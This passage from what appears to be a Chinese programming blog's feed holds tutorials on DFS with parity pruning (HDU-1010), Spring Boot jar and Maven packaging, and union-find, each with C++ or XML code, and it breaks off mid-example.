class="built_in">scanf</span>(<span class="string">"%s"</span>,b);</span><br><span class="line"><span class="keyword">if</span>(a.count(b))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>,a[b]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"No Info\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> STL容器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深度优先搜索算法(DFS)</title>
      <link href="/2019/12/29/%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95/"/>
      <url>/2019/12/29/%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="在我们遇到的一些问题当中，有些问题我们不能够确切的找出数学模型，即找不出一种直接求解的方法，解决这一类问题，我们一般采用搜索的方法解决。搜索就是用问题的所有可能去试探，按照一定的顺序、规则，不断去试探，直到找到问题的解，试完了也没有找到解，那就是无解，试探时一定要试探完所有的情况-实际上就是穷举-。"><a href="#在我们遇到的一些问题当中，有些问题我们不能够确切的找出数学模型，即找不出一种直接求解的方法，解决这一类问题，我们一般采用搜索的方法解决。搜索就是用问题的所有可能去试探，按照一定的顺序、规则，不断去试探，直到找到问题的解，试完了也没有找到解，那就是无解，试探时一定要试探完所有的情况-实际上就是穷举-。" class="headerlink" title="在我们遇到的一些问题当中，有些问题我们不能够确切的找出数学模型，即找不出一种直接求解的方法，解决这一类问题，我们一般采用搜索的方法解决。搜索就是用问题的所有可能去试探，按照一定的顺序、规则，不断去试探，直到找到问题的解，试完了也没有找到解，那就是无解，试探时一定要试探完所有的情况(实际上就是穷举)。"></a>在我们遇到的一些问题当中，有些问题我们不能够确切的找出数学模型，即找不出一种直接求解的方法，解决这一类问题，我们一般采用搜索的方法解决。搜索就是用问题的所有可能去试探，按照一定的顺序、规则，不断去试探，直到找到问题的解，试完了也没有找到解，那就是无解，试探时一定要试探完所有的情况(实际上就是穷举)。</h2><p>对于问题的第一个状态，叫初始状态，要求的状态叫目标状态。<br>搜索就是把规则应用于实始状态，在其产生的状态中，直到得到一个目标状态为止。</p><a id="more"></a><p><a href="http://acm.hdu.edu.cn/" target="_blank" rel="noopener">感谢杭电刘老师的ppt</a></p><h2 id="什么是深度优先搜索"><a href="#什么是深度优先搜索" class="headerlink" title="什么是深度优先搜索"></a>什么是深度优先搜索</h2><p>所有的搜索算法从其最终的算法实现上来看，都可以划分成两个部分──控制结构和产生系统。正如前面所说的，搜索算法简而言之就是穷举所有可能情况并找到合适的答案，所以最基本的问题就是罗列出所有可能的情况，这其实就是一种产生式系统。</p><p>从根开始计算，到找到位于某个节点的解，回溯法（深度优先搜索）作为最基本的搜索算法，其采用了一种“一只向下走，走不通就掉头”的思想（体会“回溯”二字），相当于采用了先根遍历的方法来构造搜索树。</p><h3 id="借用刘老师的话"><a href="#借用刘老师的话" class="headerlink" title="借用刘老师的话"></a>借用刘老师的话</h3><p>基本思想：从初始状态S开始，利用规则生成搜索树下一层任一个结点，检查是否出现目标状态G，若未出现，以此状态利用规则生成再下一层任一个结点，再检查是否为目标节点G，若未出现，继续以上操作过程，一直进行到叶节点（即不能再生成新状态节点），当它仍不是目标状态G时，回溯到上一层结果，取另一可能扩展搜索的分支。生成新状态节点。若仍不是目标状态，就按该分支一直扩展到叶节点，若仍不是目标，采用相同的回溯办法回退到上层节点，扩展可能的分支生成新状态，…，一直进行下去，直到找到目标状态G为止。</p><h3 id="DFS算法"><a href="#DFS算法" class="headerlink" title="DFS算法"></a>DFS算法</h3><ul><li>把起始节点S线放到OPEN表中。</li><li>如果OPEN是空表，则失败退出，否则继续。</li><li>从OPEN表中取最前面的节点node移到CLOSED  表中。</li><li>若node节点是叶结点（若没有后继节点），则转向（2）。</li><li>扩展node的后继节点，产生全部后继节点，并把他们放在OPEN表的前面。各后继结点指针指向node节点。</li><li>若后继节点中某一个是目标节点，则找到一个解，成功退出。否则转向（2）循环。</li></ul><h3 id="DFS最重要的就是回溯，它的本质是递归！"><a href="#DFS最重要的就是回溯，它的本质是递归！" class="headerlink" title="DFS最重要的就是回溯，它的本质是递归！"></a>DFS最重要的就是回溯，它的本质是递归！</h3><p>我认为实质就是暴力枚举多种可能。</p><h2 id="减枝"><a href="#减枝" class="headerlink" title="减枝"></a>减枝</h2><p>对于深度优先搜索来说减枝也是极为重要的。如果遍历了一些无关紧要的节点的话就会很浪费时间，如果数据小的话还看不出。一旦数据大，减枝所带来的优化将变得极为重要。</p><h2 id="以HDU-1010-Tempter-of-the-Bone为例"><a href="#以HDU-1010-Tempter-of-the-Bone为例" class="headerlink" title="以HDU-1010-Tempter of the Bone为例"></a>以<a href="http://acm.hdu.edu.cn/showproblem.php?pid=1010" target="_blank" rel="noopener">HDU-1010-Tempter of the Bone</a>为例</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>小狗在一个古老的迷宫中发现了一根骨头，这使他非常着迷。但是，当他捡起它时，迷宫开始摇晃，小狗可以感觉到地面下沉。他意识到骨头是一个陷阱，他拼命试图摆脱这个迷宫。</p><p>迷宫是一个矩形，大小为N×M。迷宫中有一扇门。刚开始时，门是关闭的，它将在第T秒打开一小段时间（少于1秒）。因此，小狗必须在第T秒精确到达门。每秒钟，他可以将一个块移动到上，下，左和右相邻的块之一。一旦他进入一个街区，该街区的地面将开始下沉并在下一秒消失。他不能在一个街区停留超过一秒钟，也不能搬到一个拜访的街区。可怜的小狗可以生存吗？请帮助他。</p><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p>输入包含多个测试用例。每个测试用例的第一行包含三个整数N，M和T(1&lt;N,M&lt;7;0&lt;T&lt;50),分别表示迷宫的大小和门打开的时间。接下来的N行给出迷宫布局,每行包含M个字符。角色是以下字符之一：</p><p>‘X’：小狗无法进入的墙块；<br>‘S’：小狗的起点；<br>‘D’：门；或<br>“.”：空白块。</p><p>输入以三个0终止。该测试用例将不被处理。</p><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p>对于每个测试用例，如果小狗可以存活，则在一行中打印“YES”，否则打印“NO”。</p><h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><p>4 4 5<br>S.X.<br>..X.<br>..XD<br>….<br>3 4 5<br>S.X.<br>..X.<br>…D<br>0 0 0</p><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><p>NO<br>YES</p><p>典型的迷宫式搜索，每一步都只能走一次，并且只有时间刚刚好时，才能成功！</p><h3 id="深搜代码-DFS"><a href="#深搜代码-DFS" class="headerlink" title="深搜代码(DFS)"></a>深搜代码(DFS)</h3><h4 id="无减枝版本"><a href="#无减枝版本" class="headerlink" title="无减枝版本"></a>无减枝版本</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">char</span> Map[<span class="number">15</span>][<span class="number">15</span>];</span><br><span class="line"><span class="keyword">int</span> n,m,t,qx,qy,zx,zy;</span><br><span class="line"><span class="keyword">int</span> flag;</span><br><span class="line"><span class="keyword">int</span> dir[<span class="number">4</span>][<span class="number">2</span>]=&#123;<span class="number">-1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>&#125;;<span class="comment">//上下左右四个方向 </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> cnt)</span></span>&#123;      <span class="comment">//搜索</span></span><br><span class="line"><span class="keyword">if</span>(x==zx&amp;&amp;y==zy&amp;&amp;cnt==t)&#123;   <span class="comment">//如果位置和出口一样并且时间一样则为成功</span></span><br><span class="line">flag=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(flag)&#123;               <span class="comment">//只要有一次成功则直接return</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;   </span><br><span class="line"><span class="keyword">if</span>(cnt&gt;t)&#123;              <span class="comment">//如果时间超出限制</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;       <span class="comment">//四个方向寻求可以走的地方</span></span><br><span class="line"><span class="keyword">int</span> xx=x+dir[i][<span class="number">0</span>];</span><br><span class="line"><span class="keyword">int</span> yy=y+dir[i][<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span>(xx&lt;<span class="number">0</span>||yy&lt;<span class="number">0</span>||xx&gt;n<span class="number">-1</span>||yy&gt;m<span class="number">-1</span>)&#123;     <span class="comment">//如果超出地图</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(Map[xx][yy]!=<span class="string">'X'</span>)&#123;      <span class="comment">//如果可以走</span></span><br><span class="line">Map[xx][yy]=<span class="string">'X'</span>;            <span class="comment">//标记为下次不能走</span></span><br><span class="line">dfs(xx,yy,cnt+<span class="number">1</span>);       <span class="comment">//进入搜索</span></span><br><span class="line">Map[xx][yy]=<span class="string">'.'</span>;        <span class="comment">//取消标记</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d %d %d"</span>,&amp;n,&amp;m,&amp;t)!=EOF&amp;&amp;(n||m||t))&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s"</span>,Map[i]);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;m;j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(Map[i][j]==<span class="string">'S'</span>)&#123;</span><br><span class="line">qx=i;</span><br><span class="line">qy=j;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(Map[i][j]==<span class="string">'D'</span>)&#123;</span><br><span class="line">zx=i;</span><br><span class="line">zy=j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">flag=<span class="number">0</span>;</span><br><span class="line">Map[qx][qy]=<span class="string">'X'</span>;    <span class="comment">//将起点标记为不能走</span></span><br><span class="line">dfs(qx,qy,<span class="number">0</span>);       /进入搜索</span><br><span class="line"><span class="keyword">if</span>(flag)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"YES\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"NO\n"</span>); </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果没有减枝也能搜索出来，但是会超时，因为浪费了很多不必要的时间</p><p>广度和深度优先搜索有一个很大的缺陷,就是他们都是在一个给定的状态空间中穷举。这在状态空间不大的情况下是很合适的算法，可是当状态空间十分大，且不预测的情况下就不可取了。他的效率实在太低，甚至不可完成。</p><p>所以，在这里再次强调“剪枝”！</p><h4 id="减枝-1"><a href="#减枝-1" class="headerlink" title="减枝"></a>减枝</h4><p>可以把map看成这样： </p><ul><li>0 1 0 1 0 1</li><li>1 0 1 0 1 0 </li><li>0 1 0 1 0 1 </li><li>1 0 1 0 1 0 </li><li>0 1 0 1 0 1</li></ul><p>从为 0 的格子走一步，必然走向为 1 的格子<br>从为 1 的格子走一步，必然走向为 0 的格子<br>即： </p><p> 0-&gt;1或1-&gt;0 必然是奇数步<br> 0-&gt;0 走1-&gt;1 必然是偶数步</p><p>所以当遇到从 0 走向 0 但是要求时间是奇数的，或者， 从 1 走向 0 但是要求时间是偶数的 都可以直接判断不可达！</p><p>则我们可以，判断他终点和起点是否一致。来进行减枝，减去一些不必要浪费的时间</p><h4 id="伪代码"><a href="#伪代码" class="headerlink" title="伪代码"></a>伪代码</h4><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> <span class="built_in">sum</span>=<span class="built_in">t</span>-<span class="built_in">abs</span>(zx-qx)-<span class="built_in">abs</span>(zy-qy);</span><br><span class="line"><span class="built_in">if</span>(<span class="built_in">sum</span>&gt;=<span class="number">0</span>&amp;&amp;<span class="built_in">sum</span>%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">dfs(qx,qy,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">char</span> Map[<span class="number">15</span>][<span class="number">15</span>];</span><br><span class="line"><span class="keyword">int</span> n,m,t,qx,qy,zx,zy;</span><br><span class="line"><span class="keyword">int</span> flag;</span><br><span class="line"><span class="keyword">int</span> dir[<span class="number">4</span>][<span class="number">2</span>]=&#123;<span class="number">-1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>&#125;;<span class="comment">//上下左右四个方向 </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> cnt)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(x==zx&amp;&amp;y==zy&amp;&amp;cnt==t)&#123;</span><br><span class="line">flag=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(flag)&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(cnt&gt;t)&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line"><span class="keyword">int</span> xx=x+dir[i][<span class="number">0</span>];</span><br><span class="line"><span class="keyword">int</span> yy=y+dir[i][<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span>(xx&lt;<span class="number">0</span>||yy&lt;<span class="number">0</span>||xx&gt;n<span class="number">-1</span>||yy&gt;m<span class="number">-1</span>)&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(Map[xx][yy]!=<span class="string">'X'</span>)&#123;</span><br><span class="line">Map[xx][yy]=<span class="string">'X'</span>;</span><br><span class="line">dfs(xx,yy,cnt+<span class="number">1</span>);</span><br><span class="line">Map[xx][yy]=<span class="string">'.'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d %d %d"</span>,&amp;n,&amp;m,&amp;t)!=EOF&amp;&amp;(n||m||t))&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s"</span>,Map[i]);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;m;j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(Map[i][j]==<span class="string">'S'</span>)&#123;</span><br><span class="line">qx=i;</span><br><span class="line">qy=j;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(Map[i][j]==<span class="string">'D'</span>)&#123;</span><br><span class="line">zx=i;</span><br><span class="line">zy=j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">flag=<span class="number">0</span>;</span><br><span class="line">Map[qx][qy]=<span class="string">'X'</span>;</span><br><span class="line"><span class="keyword">int</span> sum=t-<span class="built_in">abs</span>(zx-qx)-<span class="built_in">abs</span>(zy-qy);</span><br><span class="line"><span class="keyword">if</span>(sum&gt;=<span class="number">0</span>&amp;&amp;sum%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">dfs(qx,qy,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(flag)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"YES\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"NO\n"</span>); </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring-boot-打包以及内外部tomcat</title>
      <link href="/2019/12/22/Spring-boot-jar%E6%89%93%E5%8C%85/"/>
      <url>/2019/12/22/Spring-boot-jar%E6%89%93%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<p>Spring Boot目前流行的java web应用开发框架，相比传统的spring开发，spring boot极大简化了配置，并且遵守约定优于配置的原则即使0配置也能正常运行，这在spring中是难以想象的。spring boot应用程序可以独立运行，框架内嵌web容器，使得web应用程序可以像本地程序一样启动和调试，十分的方便，这种设计方式也使得spring boot应用程序非常适合容器化进行大规模部署。生态方面，spring boot提供了非常丰富的组件，目前流行的java web框架基本都有spring boot版本，生态十分庞大，是目前java web开发最好的方案。</p><a id="more"></a><p>打包方式一般有三种</p><ul><li>jar打包</li><li>war打包</li><li>系统自带的Maven打包</li></ul><p>这这篇主要讲的是jar打包以及Maven</p><h2 id="springboot-tomcat"><a href="#springboot-tomcat" class="headerlink" title="springboot tomcat"></a>springboot tomcat</h2><p>因为Spring-boot内部自带<b>tomcat</b>，所以打包的时候可以选择两种：1.使用自带的tomcat服务器 2.使用外部的tomcat服务器</p><p>如果选择使用外部的tomcat服务器的话，我们可以进行直接打包，如果选择使用内部的tomcat服务器的话，我们可以在pom.xml中将自带的tomcat进行注释，仅在运行中使用，打包的话自动移除tomcat服务器</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--移除内嵌的Tomcat--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-tomcat<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--  provided 表明该包只在编译和测试的时候用--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="jar打包"><a href="#jar打包" class="headerlink" title="jar打包"></a>jar打包</h2><p>点击左上角 file-&gt;Project Structure-&gt;Artifacts-&gt;点击＋号-&gt;JAR-&gt;From modules with dependencies<br><img src="/1.jpg" alt="File"></p><p>可以把没用的maven包删掉</p><p><img src="/2.jpg" alt="+"></p><p>选择MANIFEST.MF一定要选择resources,不要放在java里</p><p><img src="/3.jpg"></p><p>之后再选择Build-&gt;Build ArtiFacts</p><p>构建完后jar在&#x2F;out&#x2F;artufacts&#x2F;你的项目名&#x2F;下有个叫项目名.jar的包就是了，拿出来放到服务器上就行了</p><p><img src="/4.jpg"></p><h2 id="Maven打包"><a href="#Maven打包" class="headerlink" title="Maven打包"></a>Maven打包</h2><p><img src="/5.jpg"></p><p>点击 <b>Maven Projects -&gt; Lifecycle -&gt; package</b></p><p><img src="/6.jpg"></p><p>可自动打包在target内</p><p><img src="/7.jpg"></p><p>然后就可以利用自己的方法运行了</p>]]></content>
      
      
      <categories>
          
          <category> Spring-boot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>并查集(最小生成树)算法以及路径压缩</title>
      <link href="/2019/12/14/%E5%B9%B6%E6%9F%A5%E9%9B%86%E7%AE%97%E6%B3%95%E4%BB%A5%E5%8F%8A%E8%B7%AF%E5%BE%84%E5%8E%8B%E7%BC%A9/"/>
      <url>/2019/12/14/%E5%B9%B6%E6%9F%A5%E9%9B%86%E7%AE%97%E6%B3%95%E4%BB%A5%E5%8F%8A%E8%B7%AF%E5%BE%84%E5%8E%8B%E7%BC%A9/</url>
      
        <content type="html"><![CDATA[<h2 id="并查集是一种树型的数据结构，用于处理一些不相交集合（Disjoint-Sets）的合并及查询问题。常常在使用中以森林来表示。"><a href="#并查集是一种树型的数据结构，用于处理一些不相交集合（Disjoint-Sets）的合并及查询问题。常常在使用中以森林来表示。" class="headerlink" title="并查集是一种树型的数据结构，用于处理一些不相交集合（Disjoint Sets）的合并及查询问题。常常在使用中以森林来表示。"></a>并查集是一种树型的数据结构，用于处理一些不相交集合（Disjoint Sets）的合并及查询问题。常常在使用中以森林来表示。</h2><a id="more"></a><p><a href="http://acm.hdu.edu.cn/" target="_blank" rel="noopener">感谢杭电刘老师的ppt</a></p><h1 id="并查集"><a href="#并查集" class="headerlink" title="并查集"></a>并查集</h1><h2 id="什么是并查集"><a href="#什么是并查集" class="headerlink" title="什么是并查集"></a>什么是并查集</h2><p>通常开始时让每个元素构成一个单元素的集合，然后按一定顺序将属于同一组的元素所在的集合合并，其间要反复查找一个元素在哪个集合中。看似并不复杂，但数据量极大，若用正常的数据结构来描述的话，往往在空间上过大。</p><p>常见两种操作：</p><ul><li>合并集合</li><li>查找某个元素属于哪个集合</li></ul><p><img src="/1.jpg" alt="并查集原理"></p><h3 id="查询根节点："><a href="#查询根节点：" class="headerlink" title="查询根节点："></a>查询根节点：</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span> r = x;</span><br><span class="line">   <span class="keyword">while</span> (f[r] != r)</span><br><span class="line">      r = f[r];</span><br><span class="line">   <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="合并集合"><a href="#合并集合" class="headerlink" title="合并集合"></a>合并集合</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fx,fy;</span><br><span class="line">    fx = findx(x);</span><br><span class="line">    fy = findx(y);</span><br><span class="line">    <span class="keyword">if</span>(fx != fy)</span><br><span class="line">        f[fx] = fy;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用相同集合合并后，来查找他们的祖先是不是同一个，如果是的话表示是同个节点，否则为不同。<br>如果查找有几个不同的节点，只需要判断F[i]的值是否为i的情况。</p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>比如HDU-1232 畅通工程</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">Problem Description</span><br><span 